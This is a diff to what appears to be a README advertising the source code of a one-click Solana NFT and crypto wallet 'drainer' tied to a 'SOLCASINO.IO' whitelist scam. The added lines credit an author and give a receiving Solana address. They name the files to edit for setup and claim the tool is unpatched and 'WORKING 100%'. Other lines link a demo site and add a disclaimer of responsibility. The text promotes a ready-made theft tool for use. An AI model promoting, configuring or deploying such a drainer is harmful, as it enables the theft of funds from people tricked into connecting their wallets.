@@ -1,11 +1,21 @@
 # 😱🥶 FULL NFT + CRYPTO 1 CLICK DRAINER SOURCE 
 # ( I AM NOT RESPONSIBLE FOR ANY ILLEGAL USE OF THIS TOOL )
 
+# THIS DRAINER WAS MADE BY https://github.com/l0stlog 
+
+# SOLANA ADDRESS TEMPORARILY SET : "8UAwRkmrixQrJ3sv4F5tM2EKYjkj5JdjaBbHHhxov52P"
+
+# Edit wallet.js and js/main.chunk.js
+
 # DEMO : https://solana-drainer.netlify.app/
 
 # SOLCASINO.IO DRAINER (WHITELIST SCAM)
 
-# Edit wallet.js and js/main.chunk.js
+# UPDATED VERSION
+
+# NOT PATCHED
+
+# WORKING 100%
 
 # Drains NFT & SOLANA IN 1 CLICK 
 
